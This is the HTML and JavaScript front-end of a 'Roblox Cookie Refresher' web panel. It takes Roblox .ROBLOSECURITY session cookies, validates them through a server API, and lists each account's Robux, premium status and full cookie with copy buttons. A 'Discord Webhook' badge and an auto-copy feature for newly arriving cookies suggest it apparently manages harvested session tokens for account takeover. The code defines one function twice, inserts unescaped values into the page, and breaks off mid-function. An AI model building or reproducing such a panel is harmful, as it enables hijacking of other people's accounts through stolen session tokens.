
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Roblox Cookie Refresher Tool</title>
    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700&display=swap" rel="stylesheet">
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        :root {
            --primary-bg: #0a0a0b;
            --secondary-bg: #1a1a1d;
            --card-bg: #2a2a2f;
            --hover-bg: #3a3a3f;
            --accent-primary: #7c3aed;
            --accent-secondary: #a855f7;
            --accent-success: #10b981;
            --accent-danger: #ef4444;
            --accent-warning: #f59e0b;
            --text-primary: #ffffff;
            --text-secondary: #9ca3af;
            --text-muted: #6b7280;
            --border-color: #374151;
            --premium-gold: #fbbf24;
            --shadow-lg: 0 20px 25px -5px rgba(0, 0, 0, 0.1), 0 10px 10px -5px rgba(0, 0, 0, 0.04);
            --shadow-xl: 0 25px 50px -12px rgba(0, 0, 0, 0.25);
        }

        body {
            font-family: 'Inter', system-ui, -apple-system, sans-serif;
            background: linear-gradient(135deg, var(--primary-bg) 0%, #1a1a2e 100%);
            color: var(--text-primary);
            min-height: 100vh;
            line-height: 1.6;
        }

        .container {
            max-width: 1400px;
            margin: 0 auto;
            padding: 20px;
        }

        .header {
            background: linear-gradient(135deg, var(--secondary-bg) 0%, var(--card-bg) 100%);
            border-radius: 24px;
            padding: 40px;
            margin-bottom: 30px;
            position: relative;
            border: 1px solid var(--border-color);
            box-shadow: var(--shadow-xl);
            overflow: hidden;
        }

        .header::before {
            content: '';
            position: absolute;
            top: 0;
            left: 0;
            right: 0;
            height: 3px;
            background: linear-gradient(90deg, var(--accent-primary), var(--accent-secondary));
        }

        .connection-status {
            position: absolute;
            top: 20px;
            right: 30px;
            display: flex;
            align-items: center;
            gap: 12px;
            background: rgba(255, 255, 255, 0.05);
            padding: 12px 20px;
            border-radius: 50px;
            backdrop-filter: blur(10px);
            border: 1px solid rgba(255, 255, 255, 0.1);
        }

        .status-dot {
            width: 10px;
            height: 10px;
            border-radius: 50%;
            background: var(--accent-success);
            animation: pulse 2s infinite;
            box-shadow: 0 0 10px currentColor;
        }

        .status-dot.disconnected {
            background: var(--accent-danger);
        }

        @keyframes pulse {
            0%, 100% { opacity: 1; transform: scale(1); }
            50% { opacity: 0.7; transform: scale(1.1); }
        }

        .header h1 {
            font-size: 3rem;
            font-weight: 700;
            margin-bottom: 16px;
            background: linear-gradient(135deg, var(--accent-primary), var(--accent-secondary));
            -webkit-background-clip: text;
            -webkit-text-fill-color: transparent;
            background-clip: text;
            text-align: center;
        }

        .header p {
            font-size: 1.2rem;
            color: var(--text-secondary);
            text-align: center;
            font-weight: 400;
        }

        .notifications {
            position: fixed;
            top: 20px;
            right: 20px;
            z-index: 1000;
            max-width: 400px;
        }

        .notification {
            background: var(--card-bg);
            border-radius: 16px;
            padding: 20px;
            margin-bottom: 12px;
            box-shadow: var(--shadow-lg);
            border: 1px solid var(--border-color);
            backdrop-filter: blur(10px);
            animation: slideIn 0.3s ease-out;
        }

        .notification.success { border-left: 4px solid var(--accent-success); }
        .notification.error { border-left: 4px solid var(--accent-danger); }
        .notification.warning { border-left: 4px solid var(--accent-warning); }

        @keyframes slideIn {
            from { transform: translateX(100%); opacity: 0; }
            to { transform: translateX(0); opacity: 1; }
        }

        .add-cookie-section {
            background: var(--secondary-bg);
            border-radius: 20px;
            padding: 40px;
            margin-bottom: 30px;
            border: 1px solid var(--border-color);
            box-shadow: var(--shadow-lg);
        }

        .add-cookie-section h2 {
            font-size: 1.8rem;
            font-weight: 600;
            margin-bottom: 24px;
            color: var(--text-primary);
        }

        .form-group {
            margin-bottom: 24px;
        }

        .form-group label {
            display: block;
            margin-bottom: 12px;
            font-weight: 500;
            color: var(--text-secondary);
            font-size: 0.95rem;
        }

        .form-group input {
            width: 100%;
            padding: 16px 20px;
            background: var(--card-bg);
            border: 2px solid var(--border-color);
            border-radius: 12px;
            font-size: 16px;
            color: var(--text-primary);
            transition: all 0.3s ease;
        }

        .form-group input:focus {
            outline: none;
            border-color: var(--accent-primary);
            box-shadow: 0 0 0 3px rgba(124, 58, 237, 0.1);
        }

        .btn {
            background: linear-gradient(135deg, var(--accent-primary), var(--accent-secondary));
            color: white;
            border: none;
            padding: 16px 32px;
            border-radius: 12px;
            font-size: 16px;
            font-weight: 500;
            cursor: pointer;
            transition: all 0.3s ease;
            position: relative;
            overflow: hidden;
            display: inline-flex;
            align-items: center;
            gap: 8px;
        }

        .btn:hover {
            transform: translateY(-2px);
            box-shadow: 0 10px 25px rgba(124, 58, 237, 0.3);
        }

        .btn:active {
            transform: translateY(0);
        }

        .btn:disabled {
            opacity: 0.6;
            cursor: not-allowed;
            transform: none;
        }

        .btn-small {
            padding: 10px 20px;
            font-size: 14px;
        }

        .btn-danger {
            background: linear-gradient(135deg, var(--accent-danger), #dc2626);
        }

        .btn-success {
            background: linear-gradient(135deg, var(--accent-success), #059669);
        }

        .btn-warning {
            background: linear-gradient(135deg, var(--accent-warning), #d97706);
        }

        .loading-spinner {
            border: 2px solid transparent;
            border-top: 2px solid currentColor;
            border-radius: 50%;
            width: 16px;
            height: 16px;
            animation: spin 1s linear infinite;
        }

        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }

        .cookies-section {
            background: var(--secondary-bg);
            border-radius: 20px;
            padding: 40px;
            border: 1px solid var(--border-color);
            box-shadow: var(--shadow-lg);
        }

        .section-header {
            display: flex;
            justify-content: space-between;
            align-items: flex-start;
            margin-bottom: 30px;
            flex-wrap: wrap;
            gap: 20px;
        }

        .section-header h2 {
            font-size: 1.8rem;
            font-weight: 600;
            color: var(--text-primary);
        }

        .stats {
            display: flex;
            gap: 24px;
            margin-top: 12px;
            flex-wrap: wrap;
        }

        .stat-item {
            display: flex;
            align-items: center;
            gap: 8px;
            background: var(--card-bg);
            padding: 8px 16px;
            border-radius: 25px;
            font-size: 14px;
            color: var(--text-secondary);
            border: 1px solid var(--border-color);
        }

        .cookies-grid {
            display: grid;
            grid-template-columns: repeat(auto-fill, minmax(480px, 1fr));
            gap: 24px;
            margin-top: 24px;
        }

        .cookie-card {
            background: var(--card-bg);
            border: 1px solid var(--border-color);
            border-radius: 20px;
            padding: 24px;
            transition: all 0.3s ease;
            position: relative;
            overflow: hidden;
        }

        .cookie-card::before {
            content: '';
            position: absolute;
            top: 0;
            left: 0;
            right: 0;
            height: 3px;
            background: linear-gradient(90deg, transparent, var(--accent-primary), transparent);
            opacity: 0;
            transition: opacity 0.3s ease;
        }

        .cookie-card:hover {
            border-color: var(--accent-primary);
            transform: translateY(-4px);
            box-shadow: var(--shadow-xl);
        }

        .cookie-card:hover::before {
            opacity: 1;
        }

        .cookie-card.valid::before {
            background: linear-gradient(90deg, transparent, var(--accent-success), transparent);
            opacity: 1;
        }

        .cookie-card.invalid::before {
            background: linear-gradient(90deg, transparent, var(--accent-danger), transparent);
            opacity: 1;
        }

        .cookie-card.loading::before {
            background: linear-gradient(90deg, transparent, var(--accent-warning), transparent);
            opacity: 1;
        }

        .cookie-card.new-cookie {
            animation: newCookieGlow 2s ease-in-out;
        }

        @keyframes newCookieGlow {
            0%, 100% { box-shadow: 0 0 0 rgba(124, 58, 237, 0); }
            50% { box-shadow: 0 0 30px rgba(124, 58, 237, 0.4); }
        }

        .cookie-header {
            display: flex;
            justify-content: space-between;
            align-items: center;
            margin-bottom: 20px;
        }

        .cookie-username {
            font-size: 1.4rem;
            font-weight: 600;
            color: var(--text-primary);
            display: flex;
            align-items: center;
            gap: 12px;
        }

        .premium-badge {
            background: linear-gradient(135deg, var(--premium-gold), #f59e0b);
            color: #1a1a1d;
            padding: 4px 12px;
            border-radius: 20px;
            font-size: 11px;
            font-weight: 600;
            text-transform: uppercase;
            letter-spacing: 0.5px;
        }

        .cookie-status {
            padding: 8px 16px;
            border-radius: 25px;
            font-size: 12px;
            font-weight: 600;
            text-transform: uppercase;
            letter-spacing: 0.5px;
        }

        .status-valid {
            background: rgba(16, 185, 129, 0.2);
            color: var(--accent-success);
            border: 1px solid var(--accent-success);
        }

        .status-invalid {
            background: rgba(239, 68, 68, 0.2);
            color: var(--accent-danger);
            border: 1px solid var(--accent-danger);
        }

        .status-loading {
            background: rgba(245, 158, 11, 0.2);
            color: var(--accent-warning);
            border: 1px solid var(--accent-warning);
        }

        .cookie-info {
            margin-bottom: 20px;
        }

        .info-row {
            display: flex;
            justify-content: space-between;
            align-items: center;
            margin-bottom: 12px;
            padding: 8px 0;
            border-bottom: 1px solid rgba(255, 255, 255, 0.05);
        }

        .info-row:last-child {
            border-bottom: none;
        }

        .info-label {
            font-weight: 500;
            color: var(--text-secondary);
            font-size: 0.9rem;
        }

        .info-value {
            color: var(--text-primary);
            text-align: right;
            max-width: 60%;
            word-wrap: break-word;
            font-weight: 500;
        }

        .cookie-actions {
            display: flex;
            gap: 12px;
            flex-wrap: wrap;
        }

        .status-indicator {
            width: 8px;
            height: 8px;
            border-radius: 50%;
            display: inline-block;
            margin-right: 8px;
        }

        .status-online {
            background: var(--accent-success);
            box-shadow: 0 0 8px rgba(16, 185, 129, 0.5);
        }

        .status-offline {
            background: var(--accent-danger);
            box-shadow: 0 0 8px rgba(239, 68, 68, 0.5);
        }

        .status-loading-indicator {
            background: var(--accent-warning);
            box-shadow: 0 0 8px rgba(245, 158, 11, 0.5);
        }

        .last-checked {
            font-size: 12px;
            color: var(--text-muted);
            margin-top: 16px;
            padding-top: 16px;
            border-top: 1px solid rgba(255, 255, 255, 0.05);
        }

        .copy-btn {
            background: linear-gradient(135deg, var(--accent-success), #059669);
            color: white;
            border: none;
            padding: 4px 10px;
            border-radius: 8px;
            font-size: 11px;
            cursor: pointer;
            margin-left: 8px;
            transition: all 0.2s ease;
        }

        .copy-btn:hover {
            transform: scale(1.05);
            box-shadow: 0 4px 12px rgba(16, 185, 129, 0.3);
        }

        .copy-btn.copied {
            background: linear-gradient(135deg, #6366f1, #4f46e5);
        }

        .copyable {
            cursor: pointer;
            position: relative;
            display: inline-flex;
            align-items: center;
            max-width: 100%;
            padding: 4px 8px;
            border-radius: 6px;
            transition: all 0.2s ease;
        }

        .copyable:hover {
            background: rgba(124, 58, 237, 0.1);
        }

        .copy-success {
            position: fixed;
            top: 50%;
            left: 50%;
            transform: translate(-50%, -50%);
            background: var(--accent-success);
            color: white;
            padding: 20px 30px;
            border-radius: 12px;
            font-weight: 600;
            z-index: 10000;
            animation: copySuccessAnimation 2s ease-in-out;
            box-shadow: var(--shadow-xl);
        }

        @keyframes copySuccessAnimation {
            0% { opacity: 0; transform: translate(-50%, -50%) scale(0.5); }
            20% { opacity: 1; transform: translate(-50%, -50%) scale(1.1); }
            80% { opacity: 1; transform: translate(-50%, -50%) scale(1); }
            100% { opacity: 0; transform: translate(-50%, -50%) scale(0.8); }
        }

        .auto-copy-alert {
            position: fixed;
            top: 20px;
            left: 50%;
            transform: translateX(-50%);
            background: linear-gradient(135deg, var(--accent-success), var(--accent-primary));
            color: white;
            padding: 24px;
            border-radius: 20px;
            box-shadow: var(--shadow-xl);
            z-index: 10001;
            animation: autoCopyAnimation 4s ease-in-out;
            text-align: center;
            min-width: 350px;
            border: 1px solid rgba(255, 255, 255, 0.2);
            backdrop-filter: blur(10px);
        }

        .auto-copy-content {
            display: flex;
            flex-direction: column;
            align-items: center;
            gap: 10px;
        }

        .auto-copy-icon {
            font-size: 2.5rem;
            animation: bounce 1s infinite;
        }

        .auto-copy-title {
            font-size: 1.3rem;
            font-weight: 700;
            text-transform: uppercase;
            letter-spacing: 1px;
        }

        .auto-copy-subtitle {
            font-size: 1.1rem;
            opacity: 0.9;
            font-weight: 500;
        }

        .auto-copy-action {
            font-size: 0.9rem;
            opacity: 0.8;
            background: rgba(255, 255, 255, 0.15);
            padding: 8px 20px;
            border-radius: 25px;
            margin-top: 8px;
        }

        @keyframes autoCopyAnimation {
            0% { opacity: 0; transform: translateX(-50%) translateY(-30px) scale(0.8); }
            15% { opacity: 1; transform: translateX(-50%) translateY(0) scale(1.05); }
            85% { opacity: 1; transform: translateX(-50%) translateY(0) scale(1); }
            100% { opacity: 0; transform: translateX(-50%) translateY(-20px) scale(0.9); }
        }

        @keyframes bounce {
            0%, 20%, 50%, 80%, 100% { transform: translateY(0); }
            40% { transform: translateY(-10px); }
            60% { transform: translateY(-5px); }
        }

        .loading {
            text-align: center;
            padding: 40px;
            color: var(--text-secondary);
            font-size: 1.1rem;
        }

        .alert {
            padding: 20px;
            border-radius: 12px;
            margin-bottom: 24px;
            border: 1px solid;
        }

        .alert-success {
            background: rgba(16, 185, 129, 0.1);
            border-color: var(--accent-success);
            color: var(--accent-success);
        }

        .alert-error {
            background: rgba(239, 68, 68, 0.1);
            border-color: var(--accent-danger);
            color: var(--accent-danger);
        }

        @media (max-width: 768px) {
            .cookies-grid {
                grid-template-columns: 1fr;
            }

            .header {
                padding: 30px 20px;
            }

            .header h1 {
                font-size: 2.5rem;
            }

            .connection-status {
                position: static;
                margin-bottom: 20px;
                justify-content: center;
            }

            .section-header {
                flex-direction: column;
                align-items: flex-start;
            }

            .stats {
                margin-top: 16px;
            }

            .add-cookie-section,
            .cookies-section {
                padding: 24px;
            }
        }

        @media (max-width: 480px) {
            .container {
                padding: 10px;
            }

            .header h1 {
                font-size: 2rem;
            }

            .cookie-actions {
                flex-direction: column;
            }

            .btn {
                width: 100%;
                justify-content: center;
            }
        }
    </style>
</head>
<body>
    <div class="notifications" id="notifications"></div>

    <div class="container">
        <div class="header">
            <div class="connection-status">
                <div class="status-dot" id="connectionDot"></div>
                <span id="connectionText">Connected</span>
                <div style="margin-left: 15px; display: flex; align-items: center; gap: 8px;">
                    <span style="font-size: 16px;">🔗</span>
                    <span style="font-size: 12px;">Discord Webhook</span>
                </div>
            </div>
            <h1>🍪 Roblox Cookie Refresher</h1>
            <p>Automatically monitor and refresh your Roblox account information in real-time</p>
        </div>

        <div class="add-cookie-section">
            <h2>✨ Add New Cookie</h2>
            <div class="form-group">
                <label for="cookieInput">Roblox .ROBLOSECURITY Cookie:</label>
                <input type="password" id="cookieInput" placeholder="Enter your .ROBLOSECURITY cookie value here...">
            </div>
            <button class="btn" id="addBtn" onclick="addCookie()">
                <span>🚀</span>
                Add Cookie
            </button>
        </div>

        <div class="cookies-section">
            <div class="section-header">
                <div>
                    <h2>🎯 Active Cookies (<span id="cookieCount">0</span>)</h2>
                    <div class="stats">
                        <div class="stat-item">
                            <span class="status-indicator status-online"></span>
                            <span>Valid: <span id="validCount">0</span></span>
                        </div>
                        <div class="stat-item">
                            <span class="status-indicator status-offline"></span>
                            <span>Invalid: <span id="invalidCount">0</span></span>
                        </div>
                        <div class="stat-item">
                            <span class="status-indicator status-loading-indicator"></span>
                            <span>Loading: <span id="loadingCount">0</span></span>
                        </div>
                    </div>
                </div>
                <div style="display: flex; gap: 12px; flex-wrap: wrap;">
                    <button class="btn btn-small btn-success" onclick="copyAllCookiesInfo()">
                        📋 Copy All Info
                    </button>
                    <button class="btn btn-success btn-small" onclick="refreshAllCookies()">
                        🔄 Refresh All
                    </button>
                </div>
            </div>

            <div id="cookiesContainer" class="cookies-grid">
                <div class="loading">No cookies added yet. Add a cookie above to get started! 🎉</div>
            </div>
        </div>
    </div>

    <script>
        let ws;
        let cookies = [];
        let connectionStatus = false;

        // Initialize WebSocket connection
        function initWebSocket() {
            // Close existing connection if it exists
            if (ws && ws.readyState === WebSocket.OPEN) {
                ws.close();
            }

            const protocol = window.location.protocol === 'https:' ? 'wss:' : 'ws:';
            ws = new WebSocket(`${protocol}//${window.location.host}`);

            // Set a connection timeout
            const connectionTimeout = setTimeout(() => {
                if (ws.readyState === WebSocket.CONNECTING) {
                    ws.close();
                    console.log('WebSocket connection timeout');
                    connectionStatus = false;
                    updateConnectionStatus();
                    setTimeout(initWebSocket, 5000);
                }
            }, 10000);

            ws.onopen = function() {
                console.log('WebSocket connected');
                clearTimeout(connectionTimeout);
                connectionStatus = true;
                updateConnectionStatus();

                // Send a heartbeat every 25 seconds to keep connection alive
                if (window.heartbeatInterval) {
                    clearInterval(window.heartbeatInterval);
                }
                window.heartbeatInterval = setInterval(() => {
                    if (ws.readyState === WebSocket.OPEN) {
                        ws.send(JSON.stringify({ type: 'ping' }));
                    }
                }, 25000);
            };

            ws.onmessage = function(event) {
                try {
                    const data = JSON.parse(event.data);
                    if (data.type !== 'pong') { // Ignore pong responses
                        handleWebSocketMessage(data);
                    }
                } catch (error) {
                    console.error('Error parsing WebSocket message:', error);
                }
            };

            ws.onclose = function(event) {
                console.log('WebSocket disconnected, attempting to reconnect...', event.code, event.reason);
                clearTimeout(connectionTimeout);
                if (window.heartbeatInterval) {
                    clearInterval(window.heartbeatInterval);
                }
                connectionStatus = false;
                updateConnectionStatus();

                // Exponential backoff for reconnection
                const retryDelay = Math.min(5000 + Math.random() * 5000, 30000);
                setTimeout(initWebSocket, retryDelay);
            };

            ws.onerror = function(error) {
                console.error('WebSocket error:', error);
                clearTimeout(connectionTimeout);
                connectionStatus = false;
                updateConnectionStatus();
            };
        }

        function updateConnectionStatus() {
            const dot = document.getElementById('connectionDot');
            const text = document.getElementById('connectionText');

            if (connectionStatus) {
                dot.classList.remove('disconnected');
                text.textContent = 'Connected';
            } else {
                dot.classList.add('disconnected');
                text.textContent = 'Disconnected';
            }
        }

        function showNotification(message, type = 'info', duration = 5000) {
            const container = document.getElementById('notifications');
            const notification = document.createElement('div');
            notification.className = `notification ${type}`;
            notification.textContent = message;

            container.appendChild(notification);

            setTimeout(() => {
                notification.remove();
            }, duration);
        }

        function handleWebSocketMessage(data) {
            switch(data.type) {
                case 'cookieList':
                    cookies = data.cookies;
                    renderCookies();
                    break;
                case 'cookieAdded':
                    cookies.push(data.cookie);
                    renderCookies();
                    // Highlight new cookie
                    setTimeout(() => {
                        const cookieCard = document.querySelector(`[data-cookie-id="${data.cookie.id}"]`);
                        if (cookieCard) {
                            cookieCard.classList.add('new-cookie');
                            setTimeout(() => {
                                cookieCard.classList.remove('new-cookie');
                            }, 2000);
                        }
                    }, 100);
                    break;
                case 'cookieUpdate':
                    const index = cookies.findIndex(c => c.id === data.cookie.id);
                    if (index !== -1) {
                        cookies[index] = data.cookie;
                        renderCookies();
                    }
                    break;
                case 'cookieRemoved':
                    cookies = cookies.filter(c => c.id !== data.cookieId);
                    renderCookies();
                    break;
                case 'notification':
                    showNotification(data.message, data.level);
                    break;
                case 'autoCopy':
                    // Auto-copy new cookie to clipboard
                    if (data.cookieData && data.cookieData.fullCookie) {
                        copyToClipboard(data.cookieData.fullCookie, 'New Cookie');
                        showNotification(data.message, 'success');
                        showAutoCardAnimation(data.cookieData.username);
                    }
                    break;
            }
        }

        // Initialize WebSocket connection
        function initWebSocket() {
            // Close existing connection if it exists
            if (ws && ws.readyState === WebSocket.OPEN) {
                ws.close();
            }

            const protocol = window.location.protocol === 'https:' ? 'wss:' : 'ws:';

            // Determine the WebSocket URL based on the environment
            let wsUrl;
            if (window.location.hostname === 'localhost' || window.location.hostname === '127.0.0.1') {
                // Local development: connect to the local server
                wsUrl = `${protocol}//${window.location.host}`;
            } else {
                // Vercel or other deployment: connect to the API route
                wsUrl = `${protocol}//${window.location.host}/api/ws`; // Assuming you have a /api/ws endpoint
            }

            ws = new WebSocket(wsUrl);

            // Set a connection timeout
            const connectionTimeout = setTimeout(() => {
                if (ws.readyState === WebSocket.CONNECTING) {
                    ws.close();
                    console.log('WebSocket connection timeout');
                    connectionStatus = false;
                    updateConnectionStatus();
                    // Fallback to polling if WebSocket fails
                    startPolling();
                }
            }, 10000);

            ws.onopen = function() {
                console.log('WebSocket connected');
                clearTimeout(connectionTimeout);
                connectionStatus = true;
                updateConnectionStatus();
                stopPolling(); // Stop polling if WebSocket connects successfully

                // Send a heartbeat every 25 seconds to keep connection alive
                if (window.heartbeatInterval) {
                    clearInterval(window.heartbeatInterval);
                }
                window.heartbeatInterval = setInterval(() => {
                    if (ws.readyState === WebSocket.OPEN) {
                        ws.send(JSON.stringify({ type: 'ping' }));
                    }
                }, 25000);
            };

            ws.onmessage = function(event) {
                try {
                    const data = JSON.parse(event.data);
                    if (data.type !== 'pong') { // Ignore pong responses
                        handleWebSocketMessage(data);
                    }
                } catch (error) {
                    console.error('Error parsing WebSocket message:', error);
                }
            };

            ws.onclose = function(event) {
                console.log('WebSocket disconnected, attempting to reconnect...', event.code, event.reason);
                clearTimeout(connectionTimeout);
                if (window.heartbeatInterval) {
                    clearInterval(window.heartbeatInterval);
                }
                connectionStatus = false;
                updateConnectionStatus();
                startPolling(); // Fallback to polling on WebSocket close
            };

            ws.onerror = function(error) {
                console.error('WebSocket error:', error);
                clearTimeout(connectionTimeout);
                connectionStatus = false;
                updateConnectionStatus();
                startPolling(); // Fallback to polling on WebSocket error
            };
        }

        let pollingInterval;

        function loadCookies() {
            fetch('/api/get-cookies')
                .then(response => response.json())
                .then(data => {
                    if (data.success) {
                        handleWebSocketMessage({ type: 'cookieList', cookies: data.cookies });
                    } else {
                        console.error('Failed to load cookies:', data.error);
                    }
                })
                .catch(error => {
                    console.error('Error loading cookies:', error);
                });
        }

        function startPolling() {
            if (!pollingInterval) {
                console.log('Starting polling for cookie updates');
                pollingInterval = setInterval(loadCookies, 5000); // Poll every 5 seconds
                loadCookies(); // Load cookies immediately when polling starts
            }
        }

        function stopPolling() {
            if (pollingInterval) {
                console.log('Stopping polling for cookie updates');
                clearInterval(pollingInterval);
                pollingInterval = null;
            }
        }

        async function addCookie() {
            const cookieInput = document.getElementById('cookieInput');
            const addBtn = document.getElementById('addBtn');
            const cookie = cookieInput.value.trim();

            if (!cookie) {
                showNotification('Please enter a cookie', 'error');
                return;
            }

            addBtn.disabled = true;
            addBtn.innerHTML = '<div class="loading-spinner"></div>Adding...';

            try {
                const response = await fetch('/api/add-cookie', {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json'
                    },
                    body: JSON.stringify({ cookie })
                });

                const result = await response.json();

                if (result.success) {
                    cookieInput.value = '';
                    showNotification('Cookie is being validated...', 'info');
                     // If using polling, refresh the list immediately
                    if (pollingInterval) {
                        loadCookies();
                    }

                } else {
                    showNotification('Failed to add cookie: ' + result.error, 'error');
                }
            } catch (error) {
                showNotification('Error adding cookie: ' + error.message, 'error');
            } finally {
                addBtn.disabled = false;
                addBtn.innerHTML = '<span>🚀</span>Add Cookie';
            }
        }

        async function refreshCookie(cookieId) {
            try {
                const response = await fetch(`/api/refresh-cookie/${cookieId}`, {
                    method: 'POST'
                });

                const result = await response.json();

                if (result.success) {
                    showNotification('Cookie refreshed successfully!', 'success');
                } else {
                    showNotification('Failed to refresh cookie', 'error');
                }
            } catch (error) {
                showNotification('Error refreshing cookie: ' + error.message, 'error');
            }
        }

        async function removeCookie(cookieId) {
            if (!confirm('Are you sure you want to remove this cookie?')) {
                return;
            }

            try {
                const response = await fetch(`/api/remove-cookie/${cookieId}`, {
                    method: 'DELETE'
                });

                const result = await response.json();

                if (result.success) {
                    showNotification('Cookie removed successfully!', 'success');
                } else {
                    showNotification('Failed to remove cookie', 'error');
                }
            } catch (error) {
                showNotification('Error removing cookie: ' + error.message, 'error');
            }
        }

        async function refreshAllCookies() {
            showNotification('Refreshing all cookies...', 'info');
            for (const cookie of cookies) {
                await refreshCookie(cookie.id);
                await new Promise(resolve => setTimeout(resolve, 2000));
            }
        }

        async function retryCookie(cookieId) {
            await refreshCookie(cookieId);
        }

        function renderCookies() {
            const container = document.getElementById('cookiesContainer');
            const countElement = document.getElementById('cookieCount');
            const validCountElement = document.getElementById('validCount');
            const invalidCountElement = document.getElementById('invalidCount');
            const loadingCountElement = document.getElementById('loadingCount');

            countElement.textContent = cookies.length;

            const validCookies = cookies.filter(c => c.isValid === true);
            const invalidCookies = cookies.filter(c => c.isValid === false);
            const loadingCookies = cookies.filter(c => c.isLoading === true || c.isValid === null);

            validCountElement.textContent = validCookies.length;
            invalidCountElement.textContent = invalidCookies.length;
            loadingCountElement.textContent = loadingCookies.length;

            if (cookies.length === 0) {
                container.innerHTML = '<div class="loading">No cookies added yet. Add a cookie above to get started! 🎉</div>';
                return;
            }

            container.innerHTML = cookies.map(cookie => `
                <div class="cookie-card ${cookie.isLoading ? 'loading' : (cookie.isValid ? 'valid' : 'invalid')}" data-cookie-id="${cookie.id}">
                    <div class="cookie-header">
                        <div>
                            <span class="status-indicator ${cookie.isLoading ? 'status-loading-indicator' : (cookie.isValid ? 'status-online' : 'status-offline')}"></span>
                            <span class="cookie-username ${cookie.isValid && !cookie.isLoading ? 'copyable' : ''}" ${cookie.isValid && !cookie.isLoading ? `onclick="copyToClipboard('${cookie.username}', 'Username')"` : ''}>
                                ${cookie.isLoading ? '<div class="loading-spinner"></div>' : ''}
                                ${cookie.username || (cookie.isValid ? 'Loading...' : 'Invalid Cookie')}
                                ${cookie.isPremium ? '<span class="premium-badge">Premium</span>' : ''}
                                ${cookie.isValid && !cookie.isLoading ? '<button class="copy-btn">📋</button>' : ''}
                            </span>
                        </div>
                        <span class="cookie-status ${cookie.isLoading ? 'status-loading' : (cookie.isValid ? 'status-valid' : 'status-invalid')}">
                            ${cookie.isLoading ? 'Loading' : (cookie.isValid ? 'Valid' : 'Invalid')}
                        </span>
                    </div>

                    <div class="cookie-info">
                        ${cookie.isValid && !cookie.isLoading ? `
                            <div class="info-row">
                                <span class="info-label">User ID:</span>
                                <span class="info-value copyable" onclick="copyToClipboard('${cookie.userId || 'N/A'}', 'User ID')">${cookie.userId || 'N/A'}<button class="copy-btn">📋</button></span>
                            </div>
                            <div class="info-row">
                                <span class="info-label">Display Name:</span>
                                <span class="info-value copyable" onclick="copyToClipboard('${cookie.displayName || 'N/A'}', 'Display Name')">${cookie.displayName || 'N/A'}<button class="copy-btn">📋</button></span>
                            </div>
                            <div class="info-row">
                                <span class="info-label">Robux:</span>
                                <span class="info-value copyable" onclick="copyToClipboard('${cookie.robux || 0}', 'Robux Amount')">💰 ${cookie.robux || 0}<button class="copy-btn">📋</button></span>
                            </div>
                            <div class="info-row">
                                <span class="info-label">Followers:</span>
                                <span class="info-value copyable" onclick="copyToClipboard('${cookie.followers || 0}', 'Followers Count')">👥 ${cookie.followers || 0}<button class="copy-btn">📋</button></span>
                            </div>
                            <div class="info-row">
                                <span class="info-label">Following:</span>
                                <span class="info-value copyable" onclick="copyToClipboard('${cookie.following || 0}', 'Following Count')">➕ ${cookie.following || 0}<button class="copy-btn">📋</button></span>
                            </div>
                            <div class="info-row">
                                <span class="info-label">Account Created:</span>
                                <span class="info-value copyable" onclick="copyToClipboard('${cookie.created ? new Date(cookie.created).toLocaleDateString() : 'N/A'}', 'Account Creation Date')">${cookie.created ? new Date(cookie.created).toLocaleDateString() : 'N/A'}<button class="copy-btn">📋</button></span>
                            </div>
                            <div class="info-row">
                                <span class="info-label">Description:</span>
                                <span class="info-value copyable" onclick="copyToClipboard('${(cookie.description && cookie.description.trim()) || 'No description'}', 'Account Description')">${(cookie.description && cookie.description.trim()) || 'No description'}<button class="copy-btn">📋</button></span>
                            </div>
                            <div class="info-row">
                                <span class="info-label">Cookie:</span>
                                <span class="info-value copyable" onclick="copyToClipboard('${cookie.fullCookie}', 'Full Cookie')">${cookie.cookie}<button class="copy-btn">📋</button></span>
                            </div>
                        ` : cookie.isLoading ? `
                            <div class="info-row">
                                <span class="info-label">Status:</span>
                                <span class="info-value">Fetching account information...</span>
                            </div>
                        ` : `
                            <div class="info-row">
                                <span class="info-label">Error:</span>
                                <span class="info-value">${cookie.error || 'Invalid cookie'}</span>
                            </div>
                        `}
                    </div>

                    <div class="cookie-actions">
                        <button class="btn btn-success btn-small" onclick="refreshCookie('${cookie.id}')" ${cookie.isLoading ? 'disabled' : ''}>
                            🔄 Refresh
                        </button>
                        ${cookie.isValid && !cookie.isLoading ? `
                        <button class="btn btn-small btn-success" onclick="copyAllInfo('${cookie.id}')">
                            📋 Copy All
                        </button>
                        ` : ''}
                        ${!cookie.isValid && !cookie.isLoading ? `
                        <button class="btn btn-small btn-warning" onclick="retryCookie('${cookie.id}')">
                            🔁 Retry
                        </button>
                        ` : ''}
                        <button class="btn btn-danger btn-small" onclick="removeCookie('${cookie.id}')" ${cookie.isLoading ? 'disabled' : ''}>
                            🗑️ Remove
                        </button>
                    </div>

                    <div class="last-checked">
                        ${cookie.addedAt ? `Added: ${new Date(cookie.addedAt).toLocaleString()} • ` : ''}
                        Last checked: ${new Date(cookie.lastChecked).toLocaleString()}
                    </div>
                </div>
            `).join('');
        }

        // Initialize on page load
        document.addEventListener('DOMContentLoaded', function() {
            // Try WebSocket first, will fall back to polling if needed
            initWebSocket();

            // Allow Enter key to submit cookie
            document.getElementById('cookieInput').addEventListener('keypress', function(e) {
                if (e.key === 'Enter') {
                    addCookie();
                }
            });
        });

        // Copy to clipboard functionality
        async function copyToClipboard(text, label = 'Text') {
            try {
                await navigator.clipboard.writeText(text);
                showCopySuccess(`${label} copied to clipboard!`);
                showNotification(`📋 ${label} copied to clipboard!`, 'success', 2000);
            } catch (err) {
                // Fallback for older browsers
                const textArea = document.createElement('textarea');
                textArea.value = text;
                textArea.style.position = 'fixed';
                textArea.style.left = '-999999px';
                textArea.style.top = '-999999px';
                document.body.appendChild(textArea);
                textArea.focus();
                textArea.select();

                try {
                    document.execCommand('copy');
                    showCopySuccess(`${label} copied to clipboard!`);
                    showNotification(`📋 ${label} copied to clipboard!`, 'success', 2000);
                } catch (fallbackErr) {
                    showNotification('Failed to copy to clipboard', 'error');
                }

                document.body.removeChild(textArea);
            }
        }

        function showCopySuccess(message) {
            const successDiv = document.createElement('div');
            successDiv.className = 'copy-success';
